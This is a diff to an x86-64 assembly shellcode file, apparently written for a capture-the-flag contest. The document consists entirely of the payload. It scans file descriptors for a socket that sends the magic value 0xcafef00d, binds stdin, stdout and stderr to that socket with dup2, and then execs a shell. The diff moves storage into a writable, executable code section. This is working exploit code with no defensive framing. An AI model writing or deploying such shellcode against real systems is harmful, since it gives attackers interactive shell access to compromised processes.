@@ -2,57 +2,57 @@
 	;; Paolo Soto
 	;; 03.02.2013
 	;; RDI, RSI, RDX, RCX, R8, and R9 then stack		
-	;; read = 3, nanosleep = 162, 
- 
+	;; read = 0, dup2 = 33, execve = 59
+
+	%define magic dword 0xcafef00d
 BITS 64
 global main
 
-main:	
+	section .mytext progbits alloc exec write
 
+main:	
 	xor rax,rax
 oursleep:
 	inc eax 
 	jno oursleep
-
-	xor rax,rax
 oursleep2:
 	inc eax 
 	jno oursleep2
-
-	;int 3			; debugging
+	;;this will busywait for about 1.5-2s
+	;; if we use a blocking read do we need to wait?
 	
+
 	xor rdi,rdi
 	mov dil,20		;adjust for the popularity of the ctf
-	xor rcx,rcx
-	mov cl,4
+	;; dil is the starting fd to read from, we try each in decending order
+	xor rdx,rdx
+	mov dl,4		;read 4 bytes
 		
 ourread:
 	dec rdi
-	jnz next
-
-next:
-	xor rax,rax			
-	mov al,3		; rax needs system call number
-	lea rsi,[rel buffer] ; TODO get rid of \0
-	syscall
+	jnz ourread.next
+	int 3			;debugging, do something else in prod
+.next:
+	xor rax,rax
+	lea rsi,[rel main] 	;since we expect to be W&X we can resue main
+	                        ;for storage 
+	syscall		     	;read rax=0
 	cmp al,4
 	jnz ourread
-
-	mov rsi,[rel buffer] ; TODO get rid of \0
-	;mov rdx, [rsi]
-	cmp [rsi],dword 0xcafef00d
+	cmp [rsi], magic ;this is our magic number %defined on top
 	jnz ourread
 
+	;; this dup2 code attaches stdin stdout and stderr to our socket
+	;; so that we can talk to whatever program we run later
 dup2: 	
 	xor rsi,rsi	
 	mov sil,2
-
-copy:
+.copy:
 	xor rax,rax
 	mov al,33		;dup2
 	syscall
 	dec rsi
-	jns copy
+	jns dup2.copy
 
 	;; now just some local shellcode
 	xor rax,rax
@@ -64,6 +64,3 @@ copy:
 	xor rsi,rsi
 	xor rdx,rdx
 	syscall
-
-buffer:
-	dd 0
